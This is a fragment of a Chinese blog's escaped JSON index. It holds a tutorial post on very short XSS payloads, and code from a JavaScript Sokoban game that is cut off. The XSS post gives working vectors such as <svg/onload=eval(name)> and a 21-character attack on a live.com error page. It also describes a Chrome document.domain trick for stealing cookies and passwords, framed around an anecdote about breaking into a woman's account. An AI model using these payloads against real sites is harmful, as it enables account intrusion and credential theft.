实例\n下面引用长谷川的PPT的一部分（此PPT引用经过作者同意）\n通过查看源代码：\n地址：\nhttps://*.live.com/?param=\u0026gt;\u0026lt;h1\u0026gt;XSSed\u0026lt;/h1\u0026gt;\u0026lt;!--#!html \u0026lt;!-- Version: \u0026#34;13.000.20177.00\u0026#34; Server: BAYIDSLEG1C38; DateTime: 2012/05/01 15:13:23 --\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; value=\u0026#34;MESSAGE: A potentially dangerous Request.QueryString value was detected from the client (param=\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;XSSed\u0026lt;/h1\u0026gt;\u0026lt;!--\u0026#34;). SOURCE: System.Web FORM:\u0026#34; /\u0026gt; 找出了XSS的原因是由错误消息引起的XSS\n然后通过攻击者自己构造的页面构造XSS，并成功实现。\n\u0026lt;iframe src=\u0026#34;target\u0026#34; name=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt; （或者使用JavaScript的window.open） 最终：作者通过21个字符实现XSS（关于实现的方法请见上面的一些比较猥琐的利用元素标签）\n代码为：\n\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt; 当然22个字符也有很多方法(//后面为我们构造的代码开始) 20 Letters \u0026lt;input type=hidden value=//\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt; 22 Letters \u0026lt;input type=hidden value=\u0026#34;//\u0026#34;\u0026gt;\u0026lt;i/onclick=URL=name\u0026gt;\u0026#34;\u0026gt; 17 Letters \u0026lt;input type=text value= //onclick=URL=name\u0026gt; 0x04 挑战最”短”\n这个活动是国外一个网站发布的，名为XSS challenge，大家有兴趣可以讨论一下\n19 Letters\n\u0026lt;x/x=\u0026amp;{eval(name)}; 22 Letters\n\u0026lt;svg/onload=eval(name) 最短的javascript执行代码，考验你”短”的时候到了\n10 Letters eval(name) 9 Letters eval(URL) 8 Letters URL=name 6 Letters $(URL) 0x05 总结\nJavascript是一门很好玩的解释型语言，每次去研究这些XSS点的时候会有很多乐趣，你越不相信这个点有XSS，那么就越要去研究这个点是否有XSS。\n其实呢~~~这些技术可以称为猥琐流。。。因为不是按正常的逻辑思维是想不到这些的，除非那些思想很猥琐的人。\n欢迎你加入猥琐这个团队，让我们一起猥琐吧。\n","permalink":"/posts/short-xss/","summary":"文章作者：xsscript(原网名Crackkay)\n0x00 背景 关键时候长度不够怎么办？\n在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。\n熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。\n0x01 现实中的悲剧 这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：\n0x02 怎么变”短” \u0026quot;\u0026gt;alert(1)\n\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;..27 letters?\nAlert(1)? No Run? Impossible? No! 在实际情况中，可以通过短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有，很多浏览器也照样可以解释为\n\u0026lt;h1\u0026gt;xss 可以解释为: \u0026lt;h1\u0026gt;xss\u0026lt;/h1\u0026gt; S1:\nS2:\nS3：\n但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用\n\u0026lt;svg/onload=domain=id\u0026gt;\nS1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？\nS2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=\u0026quot;\u0026quot;，就会出现以下的错误。\nS3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空\ndocument.domain=\u0026quot;\u0026quot;设置结果就会出现以下图片所示。\nS4:这个怎么利用？\n首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。\nS5:先来看看两段代码：\n本地构造的攻击页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是a.com./12.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;这是b.com./11.html\u0026lt;/h1\u0026gt; \u0026lt;svg/onload=domain=id\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：\nS7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.\nS8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。\nS9:通过DOM重写页面测试，测试结果如下图：\nS10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。\n\u0026lt;svg/onload=eval(name)\u0026gt;\nS1:先把代码文译一下：\n\u0026lt;svg/onload=eval(window.name)\u0026gt;\nS2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：\n本地构造的攻击页面：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; [http://11.html](http://11.html) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 存在缺陷的XSS页面：","title":"Short XSS"},{"content":"关于： 这段代码主要是为了检验自己学习Javascript的成果，游戏其实很简单，主要思维，里面我尽量的标记注释了代码的重要思维的地方。在下也是新 手，如果有什么地方可以改进或者不对的地方，非常欢迎您请指出。下面是主要的Javascript代码，完整的代码可以点击在线预览里获取。\n完整的代码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; [http://dom.js](http://dom.js) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;style\u0026gt;\u0026lt;/style\u0026gt; function $id(id){return document.getElementById(id)}; function $name(name){return document.getElementsByName(name)}; //定义地图开始 var box =[] var map1 = [ [0,0,0,1,1,1,0,0,0,0], [0,0,0,1,4,1,0,0,0,0], [0,0,0,1,0,1,1,1,1,0], [0,1,1,1,2,0,2,4,1,0], [0,1,4,0,2,3,1,1,1,0], [0,1,1,1,1,2,1,0,0,0], [0,0,0,0,1,4,1,0,0,0], [0,0,0,0,1,1,1,0,0,0] ] var map2 = [ [1,1,1,1,1,0,0,0,0,0], [1,0,0,0,1,0,0,0,0,0], [1,0,2,2,1,0,1,1,1,0], [1,3,2,0,1,0,1,4,1,0], [1,1,1,0,1,1,1,4,1,0], [0,1,1,0,0,0,0,4,1,0], [0,1,0,0,0,1,0,0,1,0], [0,1,0,0,0,1,1,1,1,0], [0,1,1,1,1,1,0,0,0,0] ] box.push(map1); box.push(map2); //定义地图结束 //定义游戏配置开始 var gameConfig={ \u0026#34;person\u0026#34;:{//定义人物配置 \u0026#34;x\u0026#34;:0, \u0026#34;y\u0026#34;:0, \u0026#34;id\u0026#34;:\u0026#34;person\u0026#34; }, \u0026#34;map\u0026#34; : 0,//定义地图 \u0026#34;endpointNumber\u0026#34;:0, /*用来存储当前关卡的终点数目, 见 createGame函数 switch case 4 .*/ \u0026#34;box\u0026#34;:{//定义每个div的参数 \u0026#34;x\u0026#34;:\u0026#34;50\u0026#34;, \u0026#34;y\u0026#34;:\u0026#34;50\u0026#34; }, \u0026#34;ko\u0026#34; : 0 ,//定义箱子是否在终点上 }; //定义游戏配置结束 //创建游戏开始 function createGame(){ //定义控制整体的div，用于当本关结束后消除上一关的地图。 $id(\u0026#34;cell\u0026#34;).innerHTML=\u0026#34;\u0026#34;; $id(\u0026#34;cell\u0026#34;).style.position=\u0026#34;absolute\u0026#34;; $id(\u0026#34;cell\u0026#34;).left =\u0026#34;0px\u0026#34;; $id(\u0026#34;cell\u0026#34;).top = \u0026#34;0px\u0026#34;; //定义控制整体div结束 //创建游戏循环 for(var i=0;i ","permalink":"/posts/js-sokoban-game/","summary":"关于： 这段代码主要是为了检验自己学习Javascript的成果，游戏其实很简单，主要思维，里面我尽量的标记注释了代码的重要思维的地方。在下也是新 手，如果有什么地方可以改进或者不对的地方，非常欢迎您请指出。下面是主要的Javascript代码，完整的代码可以点击在线预览里获取。\n完整的代码：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; [http://dom.js](http://dom.js) \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;style\u0026gt;\u0026lt;/style\u0026gt; function $id(id){return document.getElementById(id)}; function $name(name){return document.getElementsByName(name)}; //定义地图开始 var box =[] var map1 = [ [0,0,0,1,1,1,0,0,0,0], [0,0,0,1,4,1,0,0,0,0], [0,0,0,1,0,1,1,1,1,0], [0,1,1,1,2,0,2,4,1,0], [0,1,4,0,2,3,1,1,1,0], [0,1,1,1,1,2,1,0,0,0], [0,0,0,0,1,4,1,0,0,0], [0,0,0,0,1,1,1,0,0,0] ] var map2 = [ [1,1,1,1,1,0,0,0,0,0], [1,0,0,0,1,0,0,0,0,0], [1,0,2,2,1,0,1,1,1,0], [1,3,2,0,1,0,1,4,1,0], [1,1,1,0,1,1,1,4,1,0], [0,1,1,0,0,0,0,4,1,0], [0,1,0,0,0,1,0,0,1,0], [0,1,0,0,0,1,1,1,1,0], [0,1,1,1,1,1,0,0,0,0] ] box.push(map1); box.push(map2); //定义地图结束 //定义游戏配置开始 var gameConfig={ \u0026#34;person\u0026#34;:{//定义人物配置 \u0026#34;x\u0026#34;:0, \u0026#34;y\u0026#34;:0, \u0026#34;id\u0026#34;:\u0026#34;person\u0026#34; }, \u0026#34;map\u0026#34; : 0,//定义地图 \u0026#34;endpointNumber\u0026#34;:0, /*用来存储当前关卡的终点数目, 见 createGame函数 switch case 4 .","title":"Javascript原生实现推箱子游戏"},{"content":"","permalink":"/posts/","summary":"posts","title":"New Posts"}]